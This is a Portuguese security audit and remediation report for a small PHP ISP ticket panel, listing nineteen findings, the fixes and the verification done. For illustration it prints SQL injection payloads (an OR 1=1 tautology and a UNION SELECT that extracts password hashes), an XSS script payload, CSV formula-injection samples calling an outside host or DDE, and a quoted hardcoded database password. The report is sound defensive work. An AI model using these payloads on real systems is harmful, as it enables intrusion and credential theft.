# RELATÓRIO TÉCNICO — LEB-100-A (Painel de Chamados NetX ISP)

## Resumo

É um sistema pequeno (3 arquivos PHP + SQL) com falhas graves de **segurança** e de **autorização**:

- a busca da listagem é injetável em SQL;
- um cliente vê, por qualquer caminho, os chamados de todos os outros (detalhe, listagem e CSV). Isso contraria a regra de negócio do manifesto;
- a busca é refletida no HTML sem escape (XSS);
- as senhas estão em MD5 sem salt;
- há segredos de produção gravados no código.

Há também bugs que derrubam páginas: divisão por zero na média de SLA e `TypeError` com parâmetros em forma de array. Além disso, o export CSV usa um arquivo fixo compartilhado (condição de corrida), e listagem e export fazem consultas N+1.

Corrigi tudo isso sem mexer na superfície pública. As assinaturas das funções do manifesto, as rotas, os rótulos, o cabeçalho e a ordem do CSV e a estrutura da tabela HTML não mudaram. Para provar a compatibilidade, subi um MariaDB local com `schema.sql` + `seed.sql` e comparei o código original com o novo:

- todas as funções públicas devolvem saída **idêntica**, inclusive os tipos dos valores (`var_export`);
- `rotuloPrioridade` foi testada exaustivamente em 8×103 combinações de entrada;
- o HTML do técnico (listagem, busca e detalhe) sai **byte a byte igual** ao original.

As mudanças de comportamento são só as pretendidas:

- o cliente passa a ver apenas os próprios chamados;
- a injeção SQL e o XSS deixam de funcionar;
- as páginas que quebravam passam a responder.

Sem reescrita, sem dependências novas, sem trocar mysqli.

Arquivos alterados: `code/lib.php`, `code/index.php`, `code/config.php`, `code/schema.sql` (só a coluna `senha` e o comentário de migração). `code/seed.sql` ficou intacto.

---

## Achados (em ordem de prioridade de correção)

As linhas citadas usam a numeração dos arquivos **originais**.

### F1 — Injeção de SQL na busca da listagem
- **Onde:** `code/lib.php:82` (função `listarChamados`, linhas 78–85).
- **Mecanismo:** `$busca` vem direto de `$_GET['busca']` (`index.php:72`) e é concatenado entre aspas simples no `LIKE '%...%'`, sem escape nem prepared statement. Exemplos:
  - `busca=zzz' OR 1=1 -- ` devolve os 5 chamados (reproduzido);
  - `busca=zzz' UNION SELECT id,id,id,login,senha,1,1,1,NOW() FROM usuarios -- ` encaixa nas 9 colunas de `chamados`, e logins e hashes MD5 aparecem na coluna "Titulo" da tabela (a consulta foi reproduzida no banco de teste).
- **Impacto:** qualquer usuário autenticado, inclusive cliente, lê o banco inteiro: todos os chamados, logins e hashes de senha (quebráveis por serem MD5, ver F6). Dependendo dos privilégios do usuário `painel`, pode chegar a escrita e leitura de arquivos.
- **Severidade:** crítica · **Confiança:** 98
- **O que fiz:** a consulta passou para a função interna `consultarChamados()`, com `prepare` + `bind_param` (`LIKE ?` recebendo `'%'.$busca.'%'`). Com prepared statement, o mysqlnd devolve inteiros nativos. Por isso as linhas são normalizadas para string (`null` continua `null`), como `mysqli::query()` fazia, e consumidores que comparam `$c['id'] === '101'` não quebram. `listarChamados()` mantém assinatura, chaves, ordem (`criado_em DESC`) e tipos; o teste confirmou saída idêntica.

### F2 — Detalhe do chamado sem checagem de dono (IDOR)
- **Onde:** `code/index.php:52-53` (rota `?ver=`).
- **Mecanismo:** `verChamado($db, (int) $_GET['ver'])` busca qualquer id, e nada compara `usuario_id` com o usuário da sessão. `$papel` é lido na linha 39 e nunca é usado. Os ids são sequenciais (101, 102…), então basta enumerar. Reproduzido: `ana` (cliente, id 1) abre `?ver=103`, que é de `bruno`, e vê título e descrição.
- **Impacto:** quebra a regra de visibilidade do manifesto. Um cliente lê os chamados de todos os outros clientes, e as descrições podem ter dados pessoais e financeiros (ex.: "Cobrança repetida no cartão").
- **Severidade:** alta · **Confiança:** 97
- **O que fiz:** em `index.php`, se o papel não é `tecnico` e o `usuario_id` do chamado é de outra pessoa, a página responde exatamente como a de chamado inexistente ("Chamado nao encontrado."), para não confirmar que o id existe. O técnico continua vendo tudo. `verChamado()` não mudou: ela não recebe o usuário e o manifesto fixa a assinatura.

### F3 — Listagem e export CSV mostram os chamados de todos os clientes
- **Onde:** `code/index.php:44-47` (export) e `code/index.php:72-73` (listagem).
- **Mecanismo:** as duas rotas chamam `listarChamados()` / `exportarCsv()`, que fazem `SELECT * FROM chamados` sem filtro, seja qual for o papel da sessão. Reproduzido: `ana` vê 101–105 na tabela, e o CSV dela também viria completo.
- **Impacto:** o mesmo vazamento do F2, só que em massa e sem precisar enumerar ids.
- **Severidade:** alta · **Confiança:** 97
- **O que fiz:**
  - Criei `$donoFiltro` em `index.php`: `null` para técnico, senão o `uid`. Qualquer papel que não seja exatamente `tecnico` cai na visão restrita (default deny).
  - **Técnico:** continua chamando `listarChamados()` / `exportarCsv()` sem mudança.
  - **Cliente:** usa as funções internas novas, `consultarChamados($db, $busca, $uid, 'criado_em')` e `escreverCsvChamados($db, $uid)`. A consulta e o formato são os mesmos (mesmas colunas, cabeçalho e ordem por id), só com `WHERE usuario_id = ?`.
  - As funções públicas não ganharam parâmetro nenhum, e os consumidores internos (relatório gerencial, rotina noturna) continuam recebendo tudo.

### F4 — XSS refletido pelo parâmetro `busca`
- **Onde:** `code/index.php:79` (atributo `value="..."`) e `code/index.php:82` ("Resultados para:").
- **Mecanismo:** `$busca` é ecoado cru. `?busca="><script>…</script>` fecha o atributo e injeta script; o teste com o original devolveu o `<script>` intacto. O cookie de sessão não tinha `HttpOnly` (F9).
- **Impacto:** um link malicioso enviado a um técnico executa JavaScript na sessão dele: rouba o cookie, lê todos os chamados, baixa o CSV completo.
- **Severidade:** alta · **Confiança:** 97
- **O que fiz:** `htmlspecialchars($busca, ENT_QUOTES)` nos dois pontos. Os demais ecos já eram escapados ou são inteiros e rótulos fixos.

### F5 — Segredos de produção embutidos no código
- **Onde:** `code/config.php:12` (fallback `DB_PASS = 'N3tX@2013!prod'`) e `code/config.php:15` (`SMTP_API_KEY` literal).
- **Mecanismo:** quem tem acesso ao código-fonte tem a senha do banco de produção e a chave da API de e-mail. Isso inclui repositório, backups, pacotes e este próprio pacote. Se o PHP parar de interpretar `.php` por erro de configuração do servidor, o arquivo é servido em texto puro. O fallback da senha também esconde uma configuração ausente: sem `DB_PASS` no ambiente, a aplicação conecta "sem querer" com a credencial embutida.
- **Impacto:** acesso direto ao banco de produção; envio de e-mail em nome do ISP (phishing com domínio legítimo).
- **Severidade:** alta · **Confiança:** 95
- **O que fiz:** os dois valores agora vêm só do ambiente (`getenv('DB_PASS')`, `getenv('SMTP_API_KEY')`). As constantes continuam definidas com os mesmos nomes. **Isso não basta sozinho:** as duas credenciais já vazaram e precisam ser **rotacionadas**. O deploy precisa exportar `DB_PASS` e `SMTP_API_KEY` (ver Decisões).

### F6 — Senhas em MD5 sem salt
- **Onde:** `code/lib.php:15-16` (`md5($senha)` comparado em SQL) e `code/schema.sql:7` (`senha CHAR(32)`).
- **Mecanismo:**
  - MD5 é rápido (bilhões de hashes/s em GPU) e não tem salt;
  - usuários com a mesma senha têm o mesmo hash: `ana`/`bruno` e `carla`/`diego` no seed;
  - `tecmaster` e `senha123` caem em tabelas prontas;
  - somado ao F1, qualquer cliente extrai os hashes e recupera as senhas dos técnicos.
- **Impacto:** escalada de cliente para técnico (visão total) e reaproveitamento das senhas em outros sistemas do ISP.
- **Severidade:** alta · **Confiança:** 90
- **O que fiz:**
  - **Leitura:** `autenticar()` (mesma assinatura e mesmo retorno `['id','nome','papel']`) busca o usuário pelo login e verifica a senha em PHP. Para o hash legado de 32 hex usa `hash_equals(md5())`; para os demais, `password_verify()`.
  - **Migração no login:** um login legado bem-sucedido regrava a senha com `password_hash()`. Isso só acontece se a coluna já tiver ≥ 255 caracteres (consulta em `information_schema`). Se ainda for `CHAR(32)` em `sql_mode` não estrito, o MySQL truncaria o hash e o usuário ficaria trancado para fora. Falhas nessa etapa são engolidas e não impedem o login.
  - **Login inexistente:** roda um `password_verify` contra um hash fictício, para o tempo de resposta não revelar se o login existe.
  - **Schema:** `schema.sql` passou a `VARCHAR(255)`, com o `ALTER` de migração documentado.
  - **Testado:** login MD5 com coluna antiga (funciona, sem migrar); `ALTER`; login migra para `$2y$`; logins seguintes com bcrypt; senha errada → `null`.

### F7 — Export CSV por arquivo fixo e compartilhado em disco
- **Onde:** `code/lib.php:125-150` (`exportarCsv`), `code/config.php:18` (`EXPORT_DIR`).
- **Mecanismo:**
  1. **Corrida.** Toda requisição grava em `/var/www/painel/tmp/chamados.csv` e depois faz `readfile`. Com duas exportações simultâneas, uma trunca (`fopen 'w'`) o arquivo que a outra está escrevendo ou lendo, e o usuário recebe um CSV corrompido ou misturado. Com a visão por cliente do F3, a mesma corrida entregaria a um cliente o CSV de outro.
  2. **Exposição.** O arquivo com todos os chamados fica persistido em `/var/www/painel/tmp`. Se `/var/www/painel` for o docroot, `/tmp/chamados.csv` pode ser baixado sem login.
  3. **Falha silenciosa.** Se `fopen` falha (diretório inexistente ou sem permissão), a função retorna sem nada e o usuário recebe HTTP 200 vazio. Foi isso que aconteceu no ambiente de teste. Se a query falha, há `return` sem `fclose`.
- **Impacto:** export corrompido ou trocado entre usuários; possível vazamento sem autenticação; falhas invisíveis.
- **Severidade:** alta · **Confiança:** 80. O mecanismo é certo; a exposição depende do docroot real.
- **O que fiz:** `exportarCsv()` (mesma assinatura) delega para `escreverCsvChamados()`, que manda os cabeçalhos HTTP e escreve direto em `php://output`, sem arquivo intermediário. Mudaram também duas coisas na geração:
  - o nome do técnico vem do JOIN (F10);
  - `fputcsv` recebe os parâmetros `separator`/`enclosure`/`escape` explícitos com os valores padrão antigos (`,` `"` `\`). A saída é a mesma, e some o aviso de depreciação do PHP 8.4.

  Conferido: cabeçalho, ordem por id, rótulos de status e `-` para chamado sem técnico.

### F8 — `mediaResposta()` divide por zero e derruba a listagem
- **Onde:** `code/lib.php:116` (`return $soma / $qtd;`), na função das linhas 107–117.
- **Mecanismo:** se nenhum chamado tem `minutos_resposta` (base nova, ou todos aguardando 1ª resposta), `$qtd = 0`, e no PHP 8 isso lança `DivisionByZeroError`. Como `index.php:74` chama a função em toda listagem, a página principal vira erro fatal (reproduzido). Além disso, a função trazia todas as linhas para o PHP só para somar.
- **Impacto:** o painel inteiro fica indisponível nesse estado da base; o relatório gerencial que usa a função também quebra.
- **Severidade:** média · **Confiança:** 95
- **O que fiz:** `SELECT SUM(...), COUNT(*)` no banco; com `COUNT = 0` devolve `0.0`. Usei soma/contagem e a mesma divisão em PHP, não `AVG()`, para manter a precisão do float idêntica à de antes. `AVG` do MySQL arredonda para 4 casas, e um consumidor que imprime o valor cru veria a diferença.

### F9 — Fixação de sessão e cookie de sessão sem flags
- **Onde:** `code/index.php:15` (`session_start()` sem parâmetros) e `code/index.php:24-25` (login sem `session_regenerate_id`).
- **Mecanismo:** o id de sessão anterior ao login continua valendo depois dele. Um atacante que planta um id na vítima (subdomínio, XSS, rede) herda a sessão autenticada. O cookie também não tinha `HttpOnly`, o que agrava o F4.
- **Impacto:** sequestro de sessão de técnico.
- **Severidade:** média · **Confiança:** 80
- **O que fiz:** `session_regenerate_id(true)` no login bem-sucedido, e `session_set_cookie_params` com `httponly`, `samesite=Lax` e `secure` quando a requisição for HTTPS.

### F10 — Consultas N+1 para o nome do técnico
- **Onde:** `code/lib.php:89` (listagem) e `code/lib.php:137` (export), via `tecnicoNome()` (`lib.php:64-72`).
- **Mecanismo:** para cada chamado retornado há outro `SELECT nome FROM usuarios WHERE id = ?`. Com N chamados são N+1 idas ao banco, e o export (que pega a tabela inteira) é o pior caso.
- **Impacto:** tempo de resposta e carga no banco crescem linearmente com a base, sobretudo na exportação noturna.
- **Severidade:** média · **Confiança:** 95
- **O que fiz:** `LEFT JOIN usuarios t ON t.id = c.tecnico_id` com `COALESCE(t.nome, '-') AS tecnico_nome`. A semântica é a mesma de `tecnicoNome()`: `-` para técnico nulo ou inexistente. A chave `tecnico_nome` continua por último no array.

### F11 — Erro de conexão expõe detalhes do banco
- **Onde:** `code/index.php:9-12`.
- **Mecanismo:** desde o PHP 8.1, o modo padrão do mysqli lança `mysqli_sql_exception` no construtor. O `if ($db->connect_errno)` nunca roda, e a exceção não tratada mostra mensagem e stack trace ("Access denied for user 'painel'@…", caminho dos arquivos) quando `display_errors` está ligado. Reproduzido no original.
- **Impacto:** vazamento de usuário, host e caminhos; página de erro feia em vez da mensagem prevista.
- **Severidade:** baixa · **Confiança:** 75
- **O que fiz:** `try/catch` em volta do construtor. O detalhe vai para `error_log`, e o usuário vê a mesma mensagem genérica de antes. O `if` antigo ficou para ambientes com `mysqli_report` desligado.

### F12 — Parâmetros em forma de array geram erro fatal
- **Onde:** `code/index.php:22` (`$_POST['login']`, `$_POST['senha']`) e `code/index.php:72-73` (`$_GET['busca']`).
- **Mecanismo:** `?busca[]=x` ou `login[]=x` entregam array a funções tipadas `string`, o que gera `TypeError` e erro 500 com stack trace (reproduzido no login).
- **Impacto:** erros e ruído em log provocáveis por qualquer um; vazamento de caminhos com `display_errors` ligado.
- **Severidade:** baixa · **Confiança:** 90
- **O que fiz:** `is_string()` antes de usar: array no login é tratado como login inválido, e array em `busca` vira busca vazia. `ver` não-string vira id 0 ("não encontrado").

### F13 — `formatarStatus()` rotula qualquer valor desconhecido como "Resolvido"
- **Onde:** `code/lib.php:32-33`.
- **Mecanismo:** o `else` final cobre 3 e também 0, 4, 5, -1… A coluna é `TINYINT` sem `CHECK`, então um status inválido gravado por outro sistema aparece como "Resolvido" na tela, no CSV e no relatório gerencial, que casa pelo texto.
- **Impacto:** chamados em estado inválido somem das filas de trabalho e inflam a taxa de resolução.
- **Severidade:** média · **Confiança:** 60. É real como comportamento; não sei se existem dados assim em produção.
- **O que fiz:** **não alterei.** O rótulo é contrato de valor, e mudar a saída para valores fora de 1–3 muda o que o relatório gerencial conta hoje (ver Decisões). Recomendação: `CHECK (status IN (1,2,3))` depois de auditar os dados existentes.

### F14 — Regras de `rotuloPrioridade()` questionáveis e aninhamento difícil de ler
- **Onde:** `code/lib.php:40-59`.
- **Mecanismo:**
  - um chamado **crítico (4) ainda sem 1ª resposta** (`minutos = null`, como o 104 do seed) recebe "Aguardando 1a resposta", sem nenhum sinal de urgência;
  - um crítico respondido em até 30 min recebe "Alto - dentro do SLA";
  - prioridades 1 (baixa) e 2 (normal) viram "Normal".

  Pode ser intencional, mas parece um buraco na regra. O `if` em quatro níveis escondia esses casos.
- **Impacto:** o caso mais urgente da fila fica visualmente igual a um chamado de baixa prioridade.
- **Severidade:** baixa · **Confiança:** 45
- **O que fiz:** reescrevi só a forma, com guard clauses. A saída ficou **idêntica**: testei prioridades −1…6 contra `null` e −1…100 minutos, comparando com o original. Não mudei a regra: é regra de negócio sem especificação, e os rótulos são consumidos (ver Decisões). `corrigido: false`.

### F15 — Injeção de fórmula no CSV (CSV/formula injection)
- **Onde:** `code/lib.php:138-144`.
- **Mecanismo:** o título do chamado vai para o CSV sem tratamento. Ele é escrito pelo cliente, ao abrir o chamado por outro canal. Um título como `=HYPERLINK("http://x/?"&A1;"clique")` ou `=cmd|…` vira fórmula quando o técnico ou o financeiro abre o arquivo no Excel ou no LibreOffice.
- **Impacto:** exfiltração de dados da planilha ou execução via DDE no computador de quem abre o export.
- **Severidade:** média · **Confiança:** 70
- **O que fiz:** **não alterei.** A mitigação usual (prefixar `'` em campos que começam com `= + - @`) muda o conteúdo das células, e a integração de faturamento consome esse CSV (ver Decisões).

### F16 — Autorização só na camada de rota (arquitetura)
- **Onde:** `code/lib.php:78-102` × `code/index.php:38-39`.
- **Mecanismo:** as funções de dados não sabem quem está pedindo, e a regra "cliente só vê o que abriu" depende de cada rota lembrar de aplicá-la. O original não aplicava em nenhuma (F2/F3). Qualquer rota nova que chame `listarChamados()`/`verChamado()` repete o problema.
- **Impacto:** regressões de autorização a cada evolução.
- **Severidade:** média · **Confiança:** 70
- **O que fiz:** parcial. Concentrei a decisão em uma variável (`$donoFiltro`) e numa consulta interna parametrizada por dono (`consultarChamados`, `escreverCsvChamados`). Não mudei as funções públicas para exigir o usuário, porque isso muda as assinaturas. `corrigido: false`.

### F17 — Login sem limite de tentativas, sem proteção CSRF e sem logout
- **Onde:** `code/index.php:20-35`.
- **Mecanismo:**
  - nenhum contador ou atraso entre tentativas, combinado com senhas fracas no padrão do seed;
  - o formulário de login não tem token, o que permite login CSRF;
  - não existe rota de saída.
- **Impacto:** força bruta online; sessão presa na conta do atacante; sessão compartilhada em terminal de atendimento.
- **Severidade:** baixa · **Confiança:** 85
- **O que fiz:** **não alterei**. Exige estado novo (tabela ou cache de tentativas) e rotas fora do contrato (ver Decisões).

### F18 — Papel do usuário congelado na sessão
- **Onde:** `code/index.php:25` e `code/index.php:39`.
- **Mecanismo:** `papel` é copiado para a sessão no login e nunca é relido. Um técnico rebaixado a cliente, ou removido, continua com visão total até a sessão expirar.
- **Severidade:** baixa · **Confiança:** 60
- **O que fiz:** **não alterei** (ver Decisões).

### F19 — Busca `LIKE '%termo%'` e listagem sem paginação
- **Onde:** `code/lib.php:80-85`.
- **Mecanismo:** o curinga à esquerda impede o uso de índice em `titulo` (varredura completa), e a listagem traz a tabela inteira a cada página.
- **Impacto:** degradação linear com o volume de chamados.
- **Severidade:** baixa · **Confiança:** 70
- **O que fiz:** **não alterei** (ver Decisões).

---

## Decisões — o que deliberadamente NÃO mudei

1. **Assinaturas, rotas, rótulos, CSV e HTML do manifesto.** Ficaram intocados. As correções de autorização foram feitas no `index.php` e em funções internas novas (`consultarChamados`, `escreverCsvChamados`, `migrarHashSenha`). Não acrescentei nem um parâmetro opcional às funções públicas.
2. **`formatarStatus()` (F13).** O manifesto define 1/2/3. Mudar o rótulo dos valores fora disso (ex.: "Desconhecido") alteraria o que o relatório gerencial soma hoje como "Resolvido", e isso é decisão de negócio. Recomendo auditar os dados e adicionar `CHECK`.
3. **Regras de `rotuloPrioridade()` (F14).** Refatorei a forma com saída provadamente idêntica. A semântica fica para o dono do produto confirmar.
4. **Mitigação de fórmula no CSV (F15).** Prefixar células altera os dados que a integração de faturamento lê. Recomendo combinar com os consumidores ou aplicar a mitigação só no export interativo.
5. **Aspas em `"Aberto em"` no cabeçalho do CSV.** O manifesto descreve o cabeçalho como `ID,Titulo,Status,Tecnico,Aberto em`. O `fputcsv` original, porém, sempre escreveu `"Aberto em"` entre aspas, por causa do espaço. Os dois são o mesmo cabeçalho para qualquer parser CSV, e os consumidores atuais recebem a versão com aspas. Mantive os bytes do comportamento atual.
6. **O export não grava mais `EXPORT_DIR/chamados.csv`.** O contrato diz que `exportarCsv()` "escreve o CSV na saída", e isso foi mantido. O arquivo em disco era efeito colateral, e é ele que causa a corrida e a exposição do F7. A constante `EXPORT_DIR` continua definida. **Risco residual:** se algum script fora do manifesto lia esse arquivo depois de chamar a função, ele precisa capturar a saída (`ob_start()`). Vale confirmar com o time da rotina noturna.
7. **`DB_PASS`/`SMTP_API_KEY` sem fallback (F5).** É uma pré-condição de deploy: as variáveis de ambiente precisam estar definidas, senão a conexão falha com a mensagem genérica. Considerei manter o fallback para evitar indisponibilidade, mas isso deixaria o segredo no código. As duas credenciais devem ser **rotacionadas**, porque continuam no histórico.
8. **Migração de senhas (F6).** Ela é preguiçosa: só migra quem faz login. Hashes MD5 de contas inativas continuam fracos até um reset forçado. `seed.sql` ficou com `MD5()`, porque são dados de teste e o login novo os aceita e migra. O `ALTER TABLE` está em `schema.sql` e precisa rodar em produção para a migração acontecer. Sem ele, o login segue funcionando com MD5.
9. **Curingas `%`/`_` na busca.** Continuam funcionando como curingas, como no original. Agora são só dados (sem injeção), e escapá-los mudaria o resultado de buscas que já existem.
10. **`mediaResposta()` para clientes.** Continua global (média de todos os chamados). É um agregado sem dados individuais, e restringir por cliente mudaria o indicador.
11. **`tecnicoNome()` e `verChamado()`.** A listagem e o export não usam mais `tecnicoNome()`, mas a função foi mantida porque um script interno pode chamá-la. As duas concatenam um `int` já tipado na assinatura, o que não é injetável, então não mexi.
12. **Limite de tentativas, CSRF no login, logout, papel relido a cada requisição, paginação e full-text (F17–F19).** Todos exigem estado, rotas ou índices novos fora do contrato. São candidatos a uma próxima iteração, não a esta correção.
13. **Papel desconhecido.** Qualquer papel diferente de `tecnico` recebe a visão de cliente (default deny). Com o `ENUM` atual isso é equivalente à regra do manifesto.

## Verificação feita

Ambiente: MariaDB 11.8 local com `schema.sql` + `seed.sql`, PHP 8.4. Original e novo rodaram lado a lado.

- **Funções públicas:** `var_export` idêntico para `rotuloPrioridade` (exaustivo), `formatarStatus`, `listarChamados` (5 buscas), `verChamado` e `mediaResposta`.
- **HTML do técnico:** listagem, busca e detalhe idênticos ao original.
- **CSV do técnico:** cabeçalho e 5 linhas em ordem de id.
- **Cliente (`ana`):** a listagem mostra só 101/102/105; `?ver=103` responde "Chamado nao encontrado."; o CSV traz só os chamados dela.
- **Ataques:** `' OR 1=1 -- ` → 0 resultados (antes 5); XSS sai escapado.
- **Login:** MD5, migração para bcrypt e bcrypt funcionam; senha errada e login inexistente → `null`; POST de login com array não quebra mais.
- **Erros:** base sem `minutos_resposta` → `0.0` (antes erro fatal); falha de conexão → mensagem genérica (antes stack trace).
